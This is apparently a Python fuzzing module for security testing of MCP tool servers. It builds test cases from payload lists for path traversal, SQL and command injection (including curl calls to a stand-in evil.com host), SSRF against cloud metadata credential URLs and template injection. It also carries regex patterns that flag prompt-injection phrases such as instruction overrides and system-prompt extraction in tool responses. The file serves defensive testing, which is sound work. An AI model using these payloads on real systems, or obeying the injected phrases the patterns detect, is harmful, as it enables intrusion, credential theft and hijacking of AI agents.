"""Schema-aware input fuzzing for MCP tools.

Reads the ``inputSchema`` JSON Schema from each tool and generates
adversarial inputs targeting common vulnerability classes:

* Path traversal
* SQL injection
* Command injection
* SSRF
* Type confusion
* Oversized inputs
* Template injection / XSS
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any

from .client import ToolInfo


# ---------------------------------------------------------------------------
# Result type
# ---------------------------------------------------------------------------

@dataclass(slots=True)
class FuzzCase:
    """A single fuzz test case to execute against a tool."""

    tool_name: str
    arguments: dict[str, Any]
    attack_category: str     # e.g. "path-traversal", "sql-injection"
    owasp_id: str           # MCP01-MCP10
    description: str
    expected_safe_behavior: str


# ---------------------------------------------------------------------------
# Payload corpus
# ---------------------------------------------------------------------------

PATH_TRAVERSAL_PAYLOADS: list[str] = [
    "../../etc/passwd",
    "../../etc/shadow",
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\SAM",
    "....//....//etc/passwd",
    "/etc/passwd",
    "/etc/shadow",
    "C:\\Windows\\System32\\config\\SAM",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
    "/proc/self/environ",
    "/proc/self/cmdline",
    "file:///etc/passwd",
    "/dev/null",
    "\x00/etc/passwd",
    "valid/../../etc/passwd",
    ".." + "/" * 20 + "etc/passwd",
]

SQL_INJECTION_PAYLOADS: list[str] = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "1; SELECT * FROM information_schema.tables --",
    "' UNION SELECT username, password FROM users --",
    "1' AND SLEEP(5) --",
    "admin'--",
    "' OR 1=1 LIMIT 1 --",
    "1; EXEC xp_cmdshell('whoami') --",
    "'; WAITFOR DELAY '0:0:5' --",
    "1 UNION ALL SELECT NULL,NULL,NULL--",
    "${7*7}",
    "{{7*7}}",
]

COMMAND_INJECTION_PAYLOADS: list[str] = [
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "$(whoami)",
    "`whoami`",
    "; curl http://evil.com/exfil",
    "| curl http://evil.com/exfil",
    "&& cat /etc/passwd",
    "|| cat /etc/passwd",
    "; id",
    "$(curl http://evil.com/$(whoami))",
    "\n/bin/sh -c 'id'",
    "';import os;os.system('id')#",
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
]

SSRF_PAYLOADS: list[str] = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[::ffff:169.254.169.254]/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
    "file:///etc/passwd",
    "http://localhost:22",
    "http://127.0.0.1:6379/",
    "gopher://127.0.0.1:6379/_INFO",
    "http://0x7f000001/",
    "dict://127.0.0.1:6379/INFO",
]

GENERIC_STRING_PAYLOADS: list[tuple[str, str]] = [
    ("A" * 10000, "oversized-input"),
    ("A" * 100000, "oversized-input"),
    ("\x00" * 10, "null-bytes"),
    ("valid\x00injected", "null-byte-injection"),
    ("<script>alert(1)</script>", "xss"),
    ("<img src=x onerror=alert(1)>", "xss"),
    ("{{7*7}}", "template-injection"),
    ("${7*7}", "template-injection"),
    ("#{7*7}", "template-injection"),
    ("{%import os%}{{os.popen('id').read()}}", "ssti"),
    ("' OR ''='", "generic-injection"),
    ("%s%s%s%s%s%s%s%s%s%s", "format-string"),
    ("\\u0000\\u0001\\u0002", "unicode-escape"),
]

NUMBER_PAYLOADS: list[tuple[Any, str]] = [
    (2**31 - 1, "max-int32"),
    (2**63 - 1, "max-int64"),
    (-2**31, "min-int32"),
    (-1, "negative"),
    (0, "zero"),
    (99999999999999999, "very-large"),
    (1.7976931348623157e+308, "float-max"),
    (float("inf"), "infinity"),
    (float("nan"), "nan"),
]

TYPE_CONFUSION_PAYLOADS: list[tuple[Any, str, str]] = [
    # (value, target_type, description)
    ("true", "string-for-bool", "string 'true' instead of boolean"),
    ("1", "string-for-int", "string '1' instead of integer"),
    ("null", "string-for-null", "string 'null' instead of null"),
    ([], "array-for-string", "empty array instead of string"),
    ({}, "object-for-string", "empty object instead of string"),
    (True, "bool-for-string", "boolean true instead of string"),
    (0, "int-for-string", "integer 0 instead of string"),
    (None, "null-for-string", "null instead of string"),
]


# ---------------------------------------------------------------------------
# Param-name → category matching
# ---------------------------------------------------------------------------

_PATH_NAMES = re.compile(
    r"(path|file|filepath|file_path|filename|file_name|"
    r"directory|dir|folder|location|source|destination|target|root)",
    re.IGNORECASE,
)

_QUERY_NAMES = re.compile(
    r"(query|sql|search|filter|where|expression|statement)",
    re.IGNORECASE,
)

_CMD_NAMES = re.compile(
    r"(command|cmd|script|exec|code|shell|run|program)",
    re.IGNORECASE,
)

_URL_NAMES = re.compile(
    r"(url|uri|endpoint|href|link|redirect|callback|webhook|fetch)",
    re.IGNORECASE,
)

_PRIVILEGE_NAMES = re.compile(
    r"(role|scope|permission|privilege|access_level|admin|"
    r"user_role|auth_level|trust|level|mode)",
    re.IGNORECASE,
)

# ---------------------------------------------------------------------------
# MCP02 — Privilege Escalation payloads
# ---------------------------------------------------------------------------

PRIVILEGE_ESCALATION_PAYLOADS: list[tuple[str, str]] = [
    ("admin", "escalate to admin"),
    ("root", "escalate to root"),
    ("superuser", "escalate to superuser"),
    ("system", "escalate to system"),
    ("*", "wildcard scope"),
    ("read write delete admin", "all permissions"),
    ("../../../../", "path traversal in role"),
    ("admin' OR '1'='1", "SQLi in role field"),
    ("__proto__", "prototype pollution via role"),
]

# ---------------------------------------------------------------------------
# MCP06 — Intent Flow Subversion: response poisoning detection payloads
# These are benign tool inputs; we check the *response* for injection
# ---------------------------------------------------------------------------

# Patterns that indicate a tool response is trying to hijack the LLM
RESPONSE_POISONING_PATTERNS: list[tuple[str, str]] = [
    (r"ignore\s+(previous|prior|above|all)\s+(instructions?|rules?|guidelines?)", "instruction override"),
    (r"(system|assistant)\s*[\s_:]*(override|instruction|message|prompt)", "system override"),
    (r"you\s+(must|should|need\s+to|are\s+required\s+to)\s+(now|always|immediately)", "imperative directive"),
    (r"your\s+new\s+(task|instructions?|role|objective|goal)\s+(is|are)", "goal substitution"),
    (r"(do\s+not|don'?t|never)\s+(tell|inform|reveal|mention)\s+(the\s+)?user", "concealment directive"),
    (r"(secretly|silently|quietly|without\s+telling)\s+(send|post|forward|exfiltrate|transmit)", "covert exfil"),
    (r"output\s+(your|the)\s+(system\s+prompt|instructions|config|api\s*key)", "data extraction"),
    (r"IMPORTANT\s*:\s*", "priority injection marker"),
    (r"\[SYSTEM\]|\[ADMIN\]|\[OVERRIDE\]", "fake authority tag"),
    (r"base64\s+encode\s+(the|your|all)", "encoding evasion"),
    (r"append\s+(to|the)\s+(url|request|query)", "data exfil via URL"),
]

# ---------------------------------------------------------------------------
# MCP10 — Context Injection: canary tokens for cross-tool leakage
# ---------------------------------------------------------------------------

CONTEXT_CANARY = "KHAOS-MCP-CANARY-x7k9m2p4"


def _classify_param(name: str, schema: dict[str, Any]) -> str:
    """Classify a parameter into a vulnerability category based on name/schema."""
    desc = str(schema.get("description", "")).lower()
    combined = f"{name.lower()} {desc}"

    if _PATH_NAMES.search(combined):
        return "path"
    if _QUERY_NAMES.search(combined):
        return "query"
    if _CMD_NAMES.search(combined):
        return "command"
    if _URL_NAMES.search(combined):
        return "url"
    if _PRIVILEGE_NAMES.search(combined):
        return "privilege"
    return "generic"


def _build_base_args(
    properties: dict[str, Any],
    target_param: str,
) -> dict[str, Any]:
    """Build minimal valid arguments with safe defaults for non-target params."""
    args: dict[str, Any] = {}
    for name, schema in properties.items():
        if name == target_param:
            continue
        ptype = schema.get("type", "string")
        if ptype == "string":
            args[name] = "test"
        elif ptype == "integer":
            args[name] = 1
        elif ptype == "number":
            args[name] = 1.0
        elif ptype == "boolean":
            args[name] = True
        elif ptype == "array":
            args[name] = []
        elif ptype == "object":
            args[name] = {}
    return args


# ---------------------------------------------------------------------------
# Fuzz case generation
# ---------------------------------------------------------------------------

def generate_fuzz_cases(tool: ToolInfo) -> list[FuzzCase]:
    """Generate adversarial fuzz cases for a single MCP tool.

    Reads the tool's ``input_schema`` and produces targeted payloads for
    each parameter based on its name, type, and description.
    """
    cases: list[FuzzCase] = []
    properties = tool.input_schema.get("properties", {})

    if not properties:
        return cases

    for param_name, param_schema in properties.items():
        param_type = param_schema.get("type", "string")
        category = _classify_param(param_name, param_schema)
        base_args = _build_base_args(properties, param_name)

        # --- Category-specific payloads ---

        if category == "path":
            for payload in PATH_TRAVERSAL_PAYLOADS:
                args = {**base_args, param_name: payload}
                cases.append(FuzzCase(
                    tool_name=tool.name,
                    arguments=args,
                    attack_category="path-traversal",
                    owasp_id="MCP05",
                    description=f"Path traversal via '{param_name}': {payload[:60]}",
                    expected_safe_behavior=(
                        "Server should reject paths outside allowed directories, "
                        "return an error, or sanitize the input."
                    ),
                ))

        elif category == "query":
            for payload in SQL_INJECTION_PAYLOADS:
                args = {**base_args, param_name: payload}
                cases.append(FuzzCase(
                    tool_name=tool.name,
                    arguments=args,
                    attack_category="sql-injection",
                    owasp_id="MCP05",
                    description=f"SQL injection via '{param_name}': {payload[:60]}",
                    expected_safe_behavior=(
                        "Server should use parameterized queries or reject "
                        "injection patterns."
                    ),
                ))

        elif category == "command":
            for payload in COMMAND_INJECTION_PAYLOADS:
                args = {**base_args, param_name: payload}
                cases.append(FuzzCase(
                    tool_name=tool.name,
                    arguments=args,
                    attack_category="command-injection",
                    owasp_id="MCP05",
                    description=f"Command injection via '{param_name}': {payload[:60]}",
                    expected_safe_behavior=(
                        "Server should sanitize input, use allowlists, or avoid "
                        "passing user input to shell commands."
                    ),
                ))

        elif category == "url":
            for payload in SSRF_PAYLOADS:
                args = {**base_args, param_name: payload}
                cases.append(FuzzCase(
                    tool_name=tool.name,
                    arguments=args,
                    attack_category="ssrf",
                    owasp_id="MCP05",
                    description=f"SSRF via '{param_name}': {payload[:60]}",
                    expected_safe_behavior=(
                        "Server should validate URLs against an allowlist and "
                        "reject internal/metadata addresses."
                    ),
                ))

        elif category == "privilege":
            for payload, payload_desc in PRIVILEGE_ESCALATION_PAYLOADS:
                args = {**base_args, param_name: payload}
                cases.append(FuzzCase(
                    tool_name=tool.name,
                    arguments=args,
                    attack_category="privilege-escalation",
                    owasp_id="MCP02",
                    description=f"Privilege escalation via '{param_name}': {payload_desc}",
                    expected_safe_behavior=(
                        "Server should enforce role/scope constraints via allowlists, "
                        "reject unauthorized privilege changes, and never accept "
                        "arbitrary role values."
                    ),
                ))

        # --- Generic string payloads (applied to all string params) ---
        if param_type == "string":
            for payload, payload_cat in GENERIC_STRING_PAYLOADS:
                args = {**base_args, param_name: payload}
                cases.append(FuzzCase(
                    tool_name=tool.name,
                    arguments=args,
                    attack_category=payload_cat,
                    owasp_id="MCP05",
                    description=f"{payload_cat} via '{param_name}': {str(payload)[:60]}",
                    expected_safe_behavior=(
                        "Server should handle unusual input gracefully without "
                        "crashing, leaking information, or executing injected code."
                    ),
                ))

        # --- Number payloads ---
        if param_type in ("integer", "number"):
            for payload, payload_cat in NUMBER_PAYLOADS:
                args = {**base_args, param_name: payload}
                cases.append(FuzzCase(
                    tool_name=tool.name,
                    arguments=args,
                    attack_category=f"numeric-{payload_cat}",
                    owasp_id="MCP05",
                    description=f"Numeric edge case via '{param_name}': {payload}",
                    expected_safe_behavior=(
                        "Server should validate numeric ranges and handle "
                        "edge cases without overflow or crash."
                    ),
                ))

        # --- Type confusion payloads ---
        for payload, payload_cat, payload_desc in TYPE_CONFUSION_PAYLOADS:
            # Skip if payload type matches expected type
            if param_type == "string" and isinstance(payload, str):
                continue
            if param_type == "integer" and isinstance(payload, int):
                continue
            if param_type == "boolean" and isinstance(payload, bool):
                continue

            args = {**base_args, param_name: payload}
            cases.append(FuzzCase(
                tool_name=tool.name,
                arguments=args,
                attack_category=f"type-confusion-{payload_cat}",
                owasp_id="MCP05",
                description=f"Type confusion via '{param_name}': {payload_desc}",
                expected_safe_behavior=(
                    "Server should validate parameter types and reject "
                    "mismatched types with a clear error."
                ),
            ))

    # --- Secret scanning payloads (MCP01) ---
    # Call with benign input and check response for leaked secrets
    if properties:
        first_param = next(iter(properties))
        base = _build_base_args(properties, "")
        base[first_param] = "test"
        cases.append(FuzzCase(
            tool_name=tool.name,
            arguments=base,
            attack_category="secret-scanning",
            owasp_id="MCP01",
            description=f"Secret scanning: check '{tool.name}' response for leaked credentials",
            expected_safe_behavior=(
                "Server responses should never contain API keys, tokens, "
                "passwords, or other secrets."
            ),
        ))

    # --- MCP03: Tool Poisoning — check responses for hidden LLM instructions ---
    # Call tool with benign input, analyze response for embedded directives
    if properties:
        first_param = next(iter(properties))
        base = _build_base_args(properties, "")
        base[first_param] = "test"
        cases.append(FuzzCase(
            tool_name=tool.name,
            arguments=base,
            attack_category="tool-poisoning",
            owasp_id="MCP03",
            description=f"Tool poisoning: check '{tool.name}' response for hidden LLM instructions",
            expected_safe_behavior=(
                "Tool responses should contain only data, never embedded "
                "instructions, system overrides, or directives aimed at "
                "manipulating the LLM's behavior."
            ),
        ))

    # --- MCP06: Intent Flow Subversion — check for response poisoning ---
    # Call tool with benign input, analyze response for prompt injection
    if properties:
        first_param = next(iter(properties))
        base = _build_base_args(properties, "")
        base[first_param] = "test"
        cases.append(FuzzCase(
            tool_name=tool.name,
            arguments=base,
            attack_category="response-poisoning",
            owasp_id="MCP06",
            description=f"Response poisoning: check '{tool.name}' for intent subversion",
            expected_safe_behavior=(
                "Tool responses must not contain prompt injection payloads "
                "that attempt to override LLM instructions, exfiltrate data, "
                "or subvert the user's intent."
            ),
        ))

    # --- MCP10: Context Injection — canary token for cross-tool leakage ---
    # Inject a canary into one param; if it appears in another tool's
    # response later, context isolation is broken.
    if properties:
        first_param = next(iter(properties))
        first_schema = properties[first_param]
        if first_schema.get("type", "string") == "string":
            base = _build_base_args(properties, "")
            base[first_param] = f"normal input {CONTEXT_CANARY} end"
            cases.append(FuzzCase(
                tool_name=tool.name,
                arguments=base,
                attack_category="context-injection",
                owasp_id="MCP10",
                description=f"Context injection: inject canary into '{tool.name}' via '{first_param}'",
                expected_safe_behavior=(
                    "Canary tokens injected into one tool call must not leak "
                    "into subsequent tool responses. Each tool invocation "
                    "should have isolated context."
                ),
            ))

    return cases


def generate_fuzz_cases_for_tools(tools: list[ToolInfo]) -> list[FuzzCase]:
    """Generate fuzz cases for all tools in a list."""
    cases: list[FuzzCase] = []
    for tool in tools:
        cases.extend(generate_fuzz_cases(tool))
    return cases


__all__ = [
    "FuzzCase",
    "generate_fuzz_cases",
    "generate_fuzz_cases_for_tools",
]
